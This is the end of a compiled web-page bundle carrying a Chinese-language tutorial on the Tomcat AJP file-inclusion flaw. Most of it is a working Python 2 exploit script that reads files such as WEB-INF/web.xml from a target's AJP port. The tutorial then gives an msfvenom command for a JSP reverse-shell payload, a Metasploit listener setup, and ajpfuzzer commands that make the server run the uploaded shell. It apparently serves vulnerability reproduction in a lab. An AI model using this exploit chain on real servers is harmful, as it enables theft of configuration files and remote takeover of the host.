			<span class="token string">&quot;Content-Type&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Content-Language&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Content-Length&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Date&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Last-Modified&quot;</span><span class="token punctuation">,</span>
			<span class="token string">&quot;Location&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Set-Cookie&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Set-Cookie2&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Servlet-Engine&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Status&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;WWW-Authenticate&quot;</span>
			<span class="token punctuation">]</span>
	<span class="token keyword">def</span> <span class="token function">parse</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token comment"># read headers</span>
		self<span class="token punctuation">.</span>magic<span class="token punctuation">,</span> self<span class="token punctuation">.</span>data_length<span class="token punctuation">,</span> self<span class="token punctuation">.</span>prefix_code <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">&quot;&gt;HHb&quot;</span><span class="token punctuation">)</span>

		<span class="token keyword">if</span> self<span class="token punctuation">.</span>prefix_code <span class="token operator">==</span> AjpResponse<span class="token punctuation">.</span>SEND_HEADERS<span class="token punctuation">:</span>
			self<span class="token punctuation">.</span>parse_send_headers<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>
		<span class="token keyword">elif</span> self<span class="token punctuation">.</span>prefix_code <span class="token operator">==</span> AjpResponse<span class="token punctuation">.</span>SEND_BODY_CHUNK<span class="token punctuation">:</span>
			self<span class="token punctuation">.</span>parse_send_body_chunk<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>
		<span class="token keyword">elif</span> self<span class="token punctuation">.</span>prefix_code <span class="token operator">==</span> AjpResponse<span class="token punctuation">.</span>END_RESPONSE<span class="token punctuation">:</span>
			self<span class="token punctuation">.</span>parse_end_response<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>
		<span class="token keyword">elif</span> self<span class="token punctuation">.</span>prefix_code <span class="token operator">==</span> AjpResponse<span class="token punctuation">.</span>GET_BODY_CHUNK<span class="token punctuation">:</span>
			self<span class="token punctuation">.</span>parse_get_body_chunk<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>
		<span class="token keyword">else</span><span class="token punctuation">:</span>
			<span class="token keyword">raise</span> NotImplementedError

	<span class="token keyword">def</span> <span class="token function">parse_send_headers</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">:</span>
		self<span class="token punctuation">.</span>http_status_code<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">&quot;&gt;H&quot;</span><span class="token punctuation">)</span>
		self<span class="token punctuation">.</span>http_status_msg <span class="token operator">=</span> unpack_string<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>
		self<span class="token punctuation">.</span>num_headers<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">&quot;&gt;H&quot;</span><span class="token punctuation">)</span>
		self<span class="token punctuation">.</span>response_headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
		<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>num_headers<span class="token punctuation">)</span><span class="token punctuation">:</span>
			code<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">&quot;&gt;H&quot;</span><span class="token punctuation">)</span>
			<span class="token keyword">if</span> code <span class="token operator">&lt;=</span> <span class="token number">0xA000</span><span class="token punctuation">:</span> <span class="token comment"># custom header</span>
				h_name<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">&quot;%ds&quot;</span> <span class="token operator">%</span> code<span class="token punctuation">)</span>
				stream<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># \\0</span>
				h_value <span class="token operator">=</span> unpack_string<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>
			<span class="token keyword">else</span><span class="token punctuation">:</span>
				h_name <span class="token operator">=</span> AjpResponse<span class="token punctuation">.</span>COMMON_SEND_HEADERS<span class="token punctuation">[</span>code<span class="token operator">-</span><span class="token number">0xA001</span><span class="token punctuation">]</span>
				h_value <span class="token operator">=</span> unpack_string<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>
			self<span class="token punctuation">.</span>response_headers<span class="token punctuation">[</span>h_name<span class="token punctuation">]</span> <span class="token operator">=</span> h_value

	<span class="token keyword">def</span> <span class="token function">parse_send_body_chunk</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">:</span>
		self<span class="token punctuation">.</span>data_length<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">&quot;&gt;H&quot;</span><span class="token punctuation">)</span>
		self<span class="token punctuation">.</span>data <span class="token operator">=</span> stream<span class="token punctuation">.</span>read<span class="token punctuation">(</span>self<span class="token punctuation">.</span>data_length<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>

	<span class="token keyword">def</span> <span class="token function">parse_end_response</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">:</span>
		self<span class="token punctuation">.</span>reuse<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">&quot;b&quot;</span><span class="token punctuation">)</span>

	<span class="token keyword">def</span> <span class="token function">parse_get_body_chunk</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">:</span>
		rlen<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">&quot;&gt;H&quot;</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> rlen

	<span class="token decorator annotation punctuation">@staticmethod</span>
	<span class="token keyword">def</span> <span class="token function">receive</span><span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token punctuation">:</span>
		r <span class="token operator">=</span> AjpResponse<span class="token punctuation">(</span><span class="token punctuation">)</span>
		r<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>
		<span class="token keyword">return</span> r

<span class="token keyword">import</span> socket

<span class="token keyword">def</span> <span class="token function">prepare_ajp_forward_request</span><span class="token punctuation">(</span>target_host<span class="token punctuation">,</span> req_uri<span class="token punctuation">,</span> method<span class="token operator">=</span>AjpForwardRequest<span class="token punctuation">.</span>GET<span class="token punctuation">)</span><span class="token punctuation">:</span>
	fr <span class="token operator">=</span> AjpForwardRequest<span class="token punctuation">(</span>AjpForwardRequest<span class="token punctuation">.</span>SERVER_TO_CONTAINER<span class="token punctuation">)</span>
	fr<span class="token punctuation">.</span>method <span class="token operator">=</span> method
	fr<span class="token punctuation">.</span>protocol <span class="token operator">=</span> <span class="token string">&quot;HTTP/1.1&quot;</span>
	fr<span class="token punctuation">.</span>req_uri <span class="token operator">=</span> req_uri
	fr<span class="token punctuation">.</span>remote_addr <span class="token operator">=</span> target_host
	fr<span class="token punctuation">.</span>remote_host <span class="token operator">=</span> <span class="token boolean">None</span>
	fr<span class="token punctuation">.</span>server_name <span class="token operator">=</span> target_host
	fr<span class="token punctuation">.</span>server_port <span class="token operator">=</span> <span class="token number">80</span>
	fr<span class="token punctuation">.</span>request_headers <span class="token operator">=</span> <span class="token punctuation">{</span>
		<span class="token string">&#39;SC_REQ_ACCEPT&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;text/html&#39;</span><span class="token punctuation">,</span>
		<span class="token string">&#39;SC_REQ_CONNECTION&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;keep-alive&#39;</span><span class="token punctuation">,</span>
		<span class="token string">&#39;SC_REQ_CONTENT_LENGTH&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;0&#39;</span><span class="token punctuation">,</span>
		<span class="token string">&#39;SC_REQ_HOST&#39;</span><span class="token punctuation">:</span> target_host<span class="token punctuation">,</span>
		<span class="token string">&#39;SC_REQ_USER_AGENT&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Mozilla&#39;</span><span class="token punctuation">,</span>
		<span class="token string">&#39;Accept-Encoding&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;gzip, deflate, sdch&#39;</span><span class="token punctuation">,</span>
		<span class="token string">&#39;Accept-Language&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;en-US,en;q=0.5&#39;</span><span class="token punctuation">,</span>
		<span class="token string">&#39;Upgrade-Insecure-Requests&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;1&#39;</span><span class="token punctuation">,</span>
		<span class="token string">&#39;Cache-Control&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;max-age=0&#39;</span>
	<span class="token punctuation">}</span>
	fr<span class="token punctuation">.</span>is_ssl <span class="token operator">=</span> <span class="token boolean">False</span>
	fr<span class="token punctuation">.</span>attributes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
	<span class="token keyword">return</span> fr

<span class="token keyword">class</span> <span class="token class-name">Tomcat</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> target_host<span class="token punctuation">,</span> target_port<span class="token punctuation">)</span><span class="token punctuation">:</span>
		self<span class="token punctuation">.</span>target_host <span class="token operator">=</span> target_host
		self<span class="token punctuation">.</span>target_port <span class="token operator">=</span> target_port

		self<span class="token punctuation">.</span>socket <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
		self<span class="token punctuation">.</span>socket<span class="token punctuation">.</span>setsockopt<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>SOL_SOCKET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SO_REUSEADDR<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
		self<span class="token punctuation">.</span>socket<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>target_host<span class="token punctuation">,</span> target_port<span class="token punctuation">)</span><span class="token punctuation">)</span>
		self<span class="token punctuation">.</span>stream <span class="token operator">=</span> self<span class="token punctuation">.</span>socket<span class="token punctuation">.</span>makefile<span class="token punctuation">(</span><span class="token string">&quot;rb&quot;</span><span class="token punctuation">,</span> bufsize<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>

	<span class="token keyword">def</span> <span class="token function">perform_request</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> req_uri<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">&#39;GET&#39;</span><span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> attributes<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		self<span class="token punctuation">.</span>req_uri <span class="token operator">=</span> req_uri
		self<span class="token punctuation">.</span>forward_request <span class="token operator">=</span> prepare_ajp_forward_request<span class="token punctuation">(</span>self<span class="token punctuation">.</span>target_host<span class="token punctuation">,</span> self<span class="token punctuation">.</span>req_uri<span class="token punctuation">,</span> method<span class="token operator">=</span>AjpForwardRequest<span class="token punctuation">.</span>REQUEST_METHODS<span class="token punctuation">.</span>get<span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Getting resource at ajp13://%s:%d%s&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>target_host<span class="token punctuation">,</span> self<span class="token punctuation">.</span>target_port<span class="token punctuation">,</span> req_uri<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">if</span> user <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">and</span> password <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
			self<span class="token punctuation">.</span>forward_request<span class="token punctuation">.</span>request_headers<span class="token punctuation">[</span><span class="token string">&#39;SC_REQ_AUTHORIZATION&#39;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&quot;Basic &quot;</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token string">&quot;%s:%s&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>user<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">&#39;base64&#39;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&#39;\\n&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">)</span>
		<span class="token keyword">for</span> h <span class="token keyword">in</span> headers<span class="token punctuation">:</span>
			self<span class="token punctuation">.</span>forward_request<span class="token punctuation">.</span>request_headers<span class="token punctuation">[</span>h<span class="token punctuation">]</span> <span class="token operator">=</span> headers<span class="token punctuation">[</span>h<span class="token punctuation">]</span>
		<span class="token keyword">for</span> a <span class="token keyword">in</span> attributes<span class="token punctuation">:</span>
			self<span class="token punctuation">.</span>forward_request<span class="token punctuation">.</span>attributes<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
		responses <span class="token operator">=</span> self<span class="token punctuation">.</span>forward_request<span class="token punctuation">.</span>send_and_receive<span class="token punctuation">(</span>self<span class="token punctuation">.</span>socket<span class="token punctuation">,</span> self<span class="token punctuation">.</span>stream<span class="token punctuation">)</span>
		<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>responses<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
			<span class="token keyword">return</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span>
		snd_hdrs_res <span class="token operator">=</span> responses<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
		data_res <span class="token operator">=</span> responses<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
		<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data_res<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
			<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;No data in response. Headers:%s\\n&quot;</span> <span class="token operator">%</span> snd_hdrs_res<span class="token punctuation">.</span>response_headers<span class="token punctuation">)</span>
		<span class="token keyword">return</span> snd_hdrs_res<span class="token punctuation">,</span> data_res

<span class="token triple-quoted-string string">&#39;&#39;&#39;
javax.servlet.include.request_uri
javax.servlet.include.path_info
javax.servlet.include.servlet_path
&#39;&#39;&#39;</span>

<span class="token keyword">import</span> argparse
parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span><span class="token punctuation">)</span>
parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;target&quot;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;Hostname or IP to attack&quot;</span><span class="token punctuation">)</span>
parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;-p&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--port&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">8009</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;AJP port to attack (default is 8009)&quot;</span><span class="token punctuation">)</span>
parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;-f&quot;</span><span class="token punctuation">,</span> <span class="token string">&#39;--file&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">&#39;WEB-INF/web.xml&#39;</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;file path :(WEB-INF/web.xml)&quot;</span><span class="token punctuation">)</span>
args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
t <span class="token operator">=</span> Tomcat<span class="token punctuation">(</span>args<span class="token punctuation">.</span>target<span class="token punctuation">,</span> args<span class="token punctuation">.</span>port<span class="token punctuation">)</span>
_<span class="token punctuation">,</span>data <span class="token operator">=</span> t<span class="token punctuation">.</span>perform_request<span class="token punctuation">(</span><span class="token string">&#39;/asdf&#39;</span><span class="token punctuation">,</span>attributes<span class="token operator">=</span><span class="token punctuation">[</span>
    <span class="token punctuation">{</span><span class="token string">&#39;name&#39;</span><span class="token punctuation">:</span><span class="token string">&#39;req_attribute&#39;</span><span class="token punctuation">,</span><span class="token string">&#39;value&#39;</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">&#39;javax.servlet.include.request_uri&#39;</span><span class="token punctuation">,</span><span class="token string">&#39;/&#39;</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token string">&#39;name&#39;</span><span class="token punctuation">:</span><span class="token string">&#39;req_attribute&#39;</span><span class="token punctuation">,</span><span class="token string">&#39;value&#39;</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">&#39;javax.servlet.include.path_info&#39;</span><span class="token punctuation">,</span>args<span class="token punctuation">.</span><span class="token builtin">file</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token string">&#39;name&#39;</span><span class="token punctuation">:</span><span class="token string">&#39;req_attribute&#39;</span><span class="token punctuation">,</span><span class="token string">&#39;value&#39;</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">&#39;javax.servlet.include.servlet_path&#39;</span><span class="token punctuation">,</span><span class="token string">&#39;/&#39;</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;----------------------------&#39;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;&quot;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>d<span class="token punctuation">.</span>data <span class="token keyword">for</span> d <span class="token keyword">in</span> data<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre></div></details><p>检测脚本使用 python2 版本：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>python2 poc.py <span class="token number">192.168</span>.1.1 <span class="token parameter variable">-p</span> <span class="token number">8009</span> <span class="token parameter variable">-f</span> WEB-INF/web.xml
</code></pre></div><p><img src="`+c+`" alt=""></p><p>获取系统权限：</p><p><em>首先需要目标服务器存在文件上传点，将制作好的图片马或者恶意文件上传至服务器利用即可获取权限。</em></p><p>假设目标服务器存在文件上传点，制作图片马或者普通的文本文件上传至服务器：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>msfvenom <span class="token parameter variable">-p</span> java/jsp_shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.1.1 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token operator">&gt;</span> test.jsp <span class="token comment"># 生成恶意代码的文件。</span>
<span class="token function">docker</span> <span class="token function">cp</span> test.jsp <span class="token operator">&lt;</span>CONTAINER_ID<span class="token operator">&gt;</span>:/usr/local/tomcat/webapps/ROOT <span class="token comment"># 将 test.jsp 上传至网站根目录。</span>
</code></pre></div><p>使用脚本读取文件：</p><p><img src="`+u+`" alt=""></p><p>下载 AJP 包构造器 ajpfuzzer：</p><p>https://github.com/doyensec/ajpfuzzer/releases</p><p>在 msf 中开启端口监听：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>use exploit/multi/handler
<span class="token builtin class-name">set</span> payload java/jsp_shell_reverse_tcp
<span class="token builtin class-name">set</span> lhost <span class="token number">192.168</span>.1.1
<span class="token builtin class-name">set</span> lport <span class="token number">4444</span>
run
</code></pre></div><p>使用 ajpfuzzer 连接目标服务器，并读取木马文件：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">java</span> <span class="token parameter variable">-jar</span> ajpfuzzer_v0.6.jar <span class="token comment"># 运行。</span>
AJPFuzzer<span class="token operator">&gt;</span> connect <span class="token number">192.168</span>.1.1 <span class="token number">8009</span> <span class="token comment"># 连接 8009。</span>
AJPFuzzer/192.168.1.1:800<span class="token operator"><span class="token file-descriptor important">9</span>&gt;</span> forwardrequest <span class="token number">2</span> <span class="token string">&quot;HTTP/1.1&quot;</span> <span class="token string">&quot;/example.jsp&quot;</span> <span class="token number">192.168</span>.1.1 <span class="token number">192.168</span>.1.1 porto <span class="token number">8009</span> <span class="token boolean">false</span> <span class="token string">&quot;Cookie:AAAA=BBBB&quot;</span>,<span class="token string">&quot;Accept-Encoding:identity&quot;</span> <span class="token string">&quot;javax.servlet.include.request_uri:11.jsp&quot;</span>,<span class="token string">&quot;javax.servlet.include.path_info:test.jsp&quot;</span>,<span class="token string">&quot;javax.servlet.include.servlet_path:/&quot;</span> <span class="token comment"># exampl.jsp 可以替换成目录下不存在的任意文件。</span>
</code></pre></div><p><img src="`+l+'" alt=""></p><p><img src="'+k+'" alt=""></p><p>msf 获取反弹shell：</p><p><img src="'+i+'" alt=""></p>',24),f=[d,_,m,g];function q(b,h){return t(),p("div",null,f)}const w=a(r,[["render",q],["__file","2.html.vue"]]);export{w as default};
